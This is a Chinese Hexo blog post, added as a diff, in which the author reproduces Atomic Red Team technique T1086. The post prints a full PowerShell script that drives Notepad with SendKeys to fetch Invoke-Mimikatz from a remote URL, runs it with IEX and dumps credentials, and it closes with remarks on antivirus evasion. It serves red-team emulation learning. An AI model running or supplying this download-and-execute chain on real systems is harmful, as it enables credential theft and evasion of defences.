@@ -1,0 +1,206 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>att&amp;ck奇妙历险记——powershell模拟键盘下载的踩坑过程 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="att&amp;amp;ck奇妙历险记0x00简介&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;原子红队是一个在github上以脚本为主的项目，主要是对于att&amp;amp;ck框架的攻击手法的实现，项目地址,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">att&ck奇妙历险记——powershell模拟键盘下载的踩坑过程</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">att&ck奇妙历险记——powershell模拟键盘下载的踩坑过程</h1>
+        <div class="stuff">
+            <span>四月 12, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/att-ck/" rel="tag">att&ck</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="att-amp-ck奇妙历险记"><a href="#att-amp-ck奇妙历险记" class="headerlink" title="att&amp;ck奇妙历险记"></a>att&amp;ck奇妙历险记</h1><h2 id="0x00简介"><a href="#0x00简介" class="headerlink" title="0x00简介"></a>0x00简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;原子红队是一个在github上以脚本为主的项目，主要是对于att&amp;ck框架的攻击手法的实现，项目地址<a href="https://github.com/redcanaryco/atomic-red-team/tree/master/atomics" target="_blank" rel="noopener">原子红队</a>，最近处于个人兴趣的原因对上面的攻击手法进行复现，恰好今天碰见了一个对我造成了很大困扰的攻击手法，解决该问题之后才写了这篇稿子。</p>
+<h2 id="0x01碰到的问题"><a href="#0x01碰到的问题" class="headerlink" title="0x01碰到的问题"></a>0x01碰到的问题</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;复现到编号为<strong>T1086</strong>的攻击手法时，碰上了一些令我十分困扰的问题。<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>T1086</strong>下是一些使用powershell的攻击手法，其中#4的是以mimikatz为例，使用<strong>PsSendKeys</strong>为手段进行攻击:</p>
+<p><img src="/.com//blog/public/img/attck1/1.png" alt="1"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;对于powershell我才刚刚开始学习，所以一上来我对什么是<strong>PsSendKeys</strong>也不是很了解，所以先进行资料的查找。<br>&nbsp;&nbsp;&nbsp;&nbsp;首先我们要了解的是，powershell可以视为cmd的基于.NET框架的究极进化体，可以实现非常多且强大的功能。与此同时C#程序可以实现的功能，powershell同样也可以实现，因为他们都是基于.NET框架的产物。正是因为这样powershell的脚本/命令可以不通过powershell.exe这个二进制文件就能执行，这需要通过<strong>System.Management.Automation</strong>这一底层接口，如果有机会我会再写一篇文章讲这个接口，今天的重点不是他。<br>&nbsp;&nbsp;&nbsp;&nbsp;因为上面说到的特性，c#可以使用的第三方dll，powershell也可以使用，今天要讲的便是<strong>System.Reflection.Assembly</strong>和<strong>System.Windows.Forms</strong>。而sendkeys是c#中模拟键盘的一种方法。<br>&nbsp;&nbsp;&nbsp;&nbsp;首先我们来看一下：官方给出的脚本，为了方便看我将其换行整理了一下：</p>
+<p><img src="/.com//blog/public/img/attck1/2.png" alt="2"></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$url=<span class="string">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'</span>;</span><br><span class="line">$wshell=New-Object -ComObject WScript.Shell;</span><br><span class="line">$reg=<span class="string">'HKCU:\Software\Microsoft\Notepad'</span>;</span><br><span class="line">$app=<span class="string">'Notepad'</span>;$props=(Get-ItemProperty $reg);</span><br><span class="line">[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');</span><br><span class="line">@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('&#125;')[0].Split('=')[5]),@('StatusBar',0))|ForEach&#123;SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]&#125;;</span><br><span class="line">$curpid=$wshell.Exec($app).ProcessID;</span><br><span class="line">While(!($title=GPS|?&#123;(Item Variable:_).Value.id-ieq$curpid&#125;|ForEach&#123;(Variable _).Value.MainWindowTitle&#125;))&#123;Start-Sleep -Milliseconds <span class="number">500</span>&#125;;</span><br><span class="line">While(!$wshell.AppActivate($title))&#123;Start-Sleep -Milliseconds <span class="number">500</span>&#125;;</span><br><span class="line">$wshell.SendKeys(<span class="string">'^o'</span>);</span><br><span class="line">Start-Sleep -Milliseconds <span class="number">1000</span>;</span><br><span class="line">@($url,(<span class="string">' '</span>*<span class="number">1000</span>),<span class="string">'~'</span>)|ForEach&#123;$wshell.SendKeys((Variable _).Value)&#125;;</span><br><span class="line">$res=$Null;</span><br><span class="line">While($res.Length -lt 2)&#123;[Windows.Forms.Clipboard]::Clear();</span><br><span class="line">@(<span class="string">'^a'</span>,<span class="string">'^c'</span>)|ForEach&#123;$wshell.SendKeys((Item Variable:_).Value)&#125;;</span><br><span class="line">Start-Sleep -Milliseconds <span class="number">500</span>;</span><br><span class="line">$res=([Windows.Forms.Clipboard]::GetText())&#125;;</span><br><span class="line">[Windows.Forms.Clipboard]::Clear();</span><br><span class="line">@(<span class="string">'%f'</span>,<span class="string">'x'</span>)|ForEach&#123;$wshell.SendKeys((Variable _).Value)&#125;;</span><br><span class="line">If(GPS|?&#123;(Item Variable:_).Value.id-ieq$curpid&#125;)&#123;@(<span class="string">'&#123;TAB&#125;'</span>,<span class="string">'~'</span>)|ForEach&#123;$wshell.SendKeys((Item Variable:_).Value)&#125;&#125;;</span><br><span class="line">@(<span class="string">'iWindowPosDY'</span>,<span class="string">'iWindowPosDX'</span>,<span class="string">'iWindowPosY'</span>,<span class="string">'iWindowPosX'</span>,<span class="string">'StatusBar'</span>)|ForEach&#123;SP $reg (Item Variable:_).Value $props.((Variable _).Value)&#125;;</span><br><span class="line">IEX($res);</span><br><span class="line">invoke-mimikatz -dumpcr</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;在windows server 2012的环境下运行，注意要使用管理员权限：</p>
+<p><img src="/.com//blog/public/img/attck1/3.png" alt="3"><br>&nbsp;&nbsp;&nbsp;&nbsp;在复现att&amp;ck时经常会出现各种各样的报错，我已经习惯去修改里面给出的脚本了，首先看一下报错的原因:路径不正确，也就是从文件名这一栏无法去直接访问这个放在web上的mimikatz的ps1脚本。<br>&nbsp;&nbsp;&nbsp;&nbsp;那我们去尝试一下以这种思路怎么才能访问到这个mimikatz，在此电脑的路径中输入url：</p>
+<p><img src="/.com//blog/public/img/attck1/4.png" alt="4"></p>
+<p><img src="/.com//blog/public/img/attck1/5.png" alt><br>&nbsp;&nbsp;&nbsp;&nbsp;成功访问到了这个mimikatz.ps1！那我们试试在记事本中能否成功，首先要对脚本进行改动。因为该脚本时通过这种方式打开记事本时，光标处于文件名处而不是路径栏中，如图:</p>
+<p><img src="/.com//blog/public/img/attck1/6.png" alt="图片.png"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;这段powershell是这样打开记事本，并选择打开文件选项的:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wshell=New-Object -ComObject WScript.Shell;</span><br><span class="line">$app=<span class="string">'Notepad'</span>;</span><br><span class="line">$curpid=$wshell.Exec($app).ProcessID;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//blog/public/img/attck1/7.png" alt="7"></p>
+<p>模拟键盘的ctrl+o，也就是打开文件选项:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$wshell=New-Object -ComObject WScript.Shell;</span><br><span class="line">$reg=<span class="string">'HKCU:\Software\Microsoft\Notepad'</span>;</span><br><span class="line">$app=<span class="string">'Notepad'</span>;</span><br><span class="line">[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');</span><br><span class="line">@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('&#125;')[0].Split('=')[5]),@('StatusBar',0))|ForEach&#123;SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]&#125;;</span><br><span class="line">$curpid=$wshell.Exec($app).ProcessID;</span><br><span class="line">While(!($title=GPS|?&#123;(Item Variable:_).Value.id-ieq$curpid&#125;|ForEach&#123;(Variable _).Value.MainWindowTitle&#125;))&#123;Start-Sleep -Milliseconds <span class="number">500</span>&#125;;</span><br><span class="line">While(!$wshell.AppActivate($title))&#123;Start-Sleep -Milliseconds <span class="number">500</span>&#125;;</span><br><span class="line">$wshell.SendKeys(<span class="string">'^o'</span>);</span><br><span class="line">Start-Sleep -Milliseconds <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//blog/public/img/attck1/8.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;使用这段命令复制记事本中的内容：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@(<span class="string">'^a'</span>,<span class="string">'^c'</span>)|ForEach&#123;$wshell.SendKeys((Item Variable:_).Value)&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;这里通过Notepad在注册表中的信息，以及powershell的GPS命令，GPS也就是cmd中的tasklist：<br><img src="/.com//blog/public/img/attck1/9.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;这段powershell中使用c#反射，也就是System.Reflection.Assembly加载命名空间System.Windows.Forms，并使用该命名空间中的类，根据注册表以及gps命令获取的记事本的名称并在该记事本中使用的crtl+o组合键。<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.windows.forms?redirectedfrom=MSDN&view=netframework-4.7.2" target="_blank" rel="noopener">（System.Windows.Forms中的类）</a></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;这时我们需要在这段powershell中添加几次如下代码:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$wshell.SendKeys(<span class="string">'&#123;tab&#125;'</span>);</span><br><span class="line">Start-Sleep -Milliseconds <span class="number">1000</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;即可将光标替换到路径栏中：</p>
+<p><img src="/.com//blog/public/img/attck1/10.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;正当我以为胜利的曙光就在眼前时，一个报错打破了我的幻想:</p>
+<p><img src="/.com//blog/public/img/attck1/11.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;记事本中打开文件的每个地方我都尝试了，我陷入了深深的自闭中。。。我决定换一个新的环境去尝试一下这个攻击手法。我换成了我的物理机的win10系统，直接将原版powershell命令执行:</p>
+<p><img src="/.com//blog/public/img/attck1/12.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;这次没有报错，但是卡在了奇怪的地方，文件名那一栏输入到一半卡住了。。。我思来想去不知道这到底又是什么原因，忽然想到了刚才powershell脚本在模拟键盘的过程中出现了中文输入法，于是我是用纯英文的键盘再次执行:</p>
+<p><img src="/.com//blog/public/img/attck1/13.png" alt="图片.png"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;居然开始下载了！还成功执行了mimikatz。<br>&nbsp;&nbsp;&nbsp;&nbsp;这次复现是我目前为止碰上最耗费我时间的一次复现，来来回回修改powershell代码和测试花了三个多小时左右，最后终于成功了。谈一谈这种攻击手法的免杀效果把，我发现这种手法被杀的几率取决于你下载并且复制的powershell脚本，所以不光可以使用mimikatz而且mimikatz对于win10实在太过鸡肋，但是我们可以通过这个手法去执行其他免杀过的ps1脚本，算是开拓了思路。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/26758474.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/163/33789475.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
